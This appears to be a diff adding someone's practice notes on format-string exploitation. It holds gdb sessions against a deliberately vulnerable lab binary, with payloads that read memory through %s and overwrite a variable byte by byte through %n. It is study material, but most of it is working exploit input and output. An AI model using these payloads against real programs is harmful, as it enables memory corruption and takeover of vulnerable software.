@@ -1,0 +1,94 @@
+Read memory address w/ a string.
+
+
+0xffffdeff:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+\xff\xde\xff\xff
+===============================================================================
+(gdb) run "$(python -c 'print "A" * 4 + "\xff\xde\xff\xff" + "%08x " * 4 + "%s"')"
+Starting program: /root/freshnuts/pentest/binary_x/practice/format_strings/0x352/fmt_vuln "$(python -c 'print "A" * 4 + "\xff\xde\xff\xff" + "%08x " * 4 + "%s"')"
+
+Breakpoint 1, 0x565555dd in main ()
+(gdb) continue 
+Continuing.
+The right way to print user-controlled input:
+AAAA����%08x %08x %08x %08x %s
+The wrong way to print user-controlled input:
+AAAA����ffffce40 ffffce8c 565555f7 41414141 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+[*] test_val @ 0x5655702c = -72 0xffffffb8
+[Inferior 1 (process 2389) exited normally]
+===============================================================================
+
+Overwrite test_var
+
+[*] test_val @ 0x5655702c = -72 0xffffffb8
+\x2c\x70\x55\x56
+===============================================================================
+gdb) continue 
+Continuing.
+The right way to print user-controlled input:
+AAAA,pUVJUNK-pUV%x%x%x%37x%n%17x%n
+The wrong way to print user-controlled input:
+AAAA,pUVJUNK-pUVffffce40ffffce8c565555f7                             41414141         4b4e554a
+[*] test_val @ 0x5655702c = 24141 0x00005e4d
+[Inferior 1 (process 2559) exited normally]
+(gdb) run "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56" + "%x%x%x%37x%n%17x%n"')"
+Starting program: /root/freshnuts/pentest/binary_x/practice/format_strings/0x352/fmt_vuln "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56" + "%x%x%x%37x%n%17x%n"')"
+
+Breakpoint 1, 0x565555dd in main ()
+(gdb) continue 
+Continuing.
+The right way to print user-controlled input:
+AAAA,pUVJUNK-pUV%x%x%x%37x%n%17x%n
+The wrong way to print user-controlled input:
+AAAA,pUVJUNK-pUVffffce40ffffce8c565555f7                             41414141         4b4e554a
+[*] test_val @ 0x5655702c = 24141 0x00005e4d
+[Inferior 1 (process 2698) exited normally]
+===============================================================================
+
+
+
+===============================================================================
+(gdb) run "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56" + "%x%x%x%118x%n%17x%n"')"
+Starting program: /root/freshnuts/pentest/binary_x/practice/format_strings/0x352/fmt_vuln "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56" + "%x%x%x%118x%n%17x%n"')"
+The right way to print user-controlled input:
+AAAA,pUVJUNK-pUV,pUVJUNK-pUV%x%x%x%118x%n%17x%n
+The wrong way to print user-controlled input:
+AAAA,pUVJUNK-pUV,pUVJUNK-pUVffffce30ffffce7c565555f7                                                                                                              41414141         4b4e554a
+[*] test_val @ 0x5655702c = 48042 0x0000bbaa
+[Inferior 1 (process 2514) exited normally]
+===============================================================================
+
+
+
+
+Overwrite Arithmetic for 'test_val'
+
+(Overwrite in little-endian order. Lowerst to Highest.
+Higher memory addresses  adjust due to lower memory addresses, thus
+shouldn't be done top-down.)
+===============================================================================
+(gdb) run "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56JUNK\x2e\x70\x55\x56JUNK\x2f\x70\x55\x56" + "%x%x%x%114x%n%17x%n%17x%n"')"
+Starting program: /root/freshnuts/pentest/binary_x/practice/format_strings/0x352/fmt_vuln "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56JUNK\x2e\x70\x55\x56JUNK\x2f\x70\x55\x56" + "%x%x%x%114x%n%17x%n%17x%n"')"
+The right way to print user-controlled input:
+AAAA,pUVJUNK-pUVJUNK.pUVJUNK/pUV%x%x%x%114x%n%17x%n%17x%n
+The wrong way to print user-controlled input:
+AAAA,pUVJUNK-pUVJUNK.pUVJUNK/pUVffffce20ffffce6c565555f7                                                                                                          41414141         4b4e554a         4b4e554a
+[*] test_val @ 0x5655702c = 13417386 0x00ccbbaa
+[Inferior 1 (process 2602) exited normally]
+===============================================================================
+
+
+
+Complete Overwrite
+
+===============================================================================
+(gdb) run "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56JUNK\x2e\x70\x55\x56JUNK\x2f\x70\x55\x56" + "%x%x%x%114x%n%17x%n%17x%n%17x%n"')"
+Starting program: /root/freshnuts/pentest/binary_x/practice/format_strings/0x352/fmt_vuln "$(python -c 'print "A" * 4 + "\x2c\x70\x55\x56JUNK\x2d\x70\x55\x56JUNK\x2e\x70\x55\x56JUNK\x2f\x70\x55\x56" + "%x%x%x%114x%n%17x%n%17x%n%17x%n"')"
+The right way to print user-controlled input:
+AAAA,pUVJUNK-pUVJUNK.pUVJUNK/pUV%x%x%x%114x%n%17x%n%17x%n%17x%n
+The wrong way to print user-controlled input:
+AAAA,pUVJUNK-pUVJUNK.pUVJUNK/pUVffffce20ffffce6c565555f7                                                                                                          41414141         4b4e554a         4b4e554a         4b4e554a
+[*] test_val @ 0x5655702c = -573785174 0xddccbbaa
+[Inferior 1 (process 2666) exited normally]
+===============================================================================
+
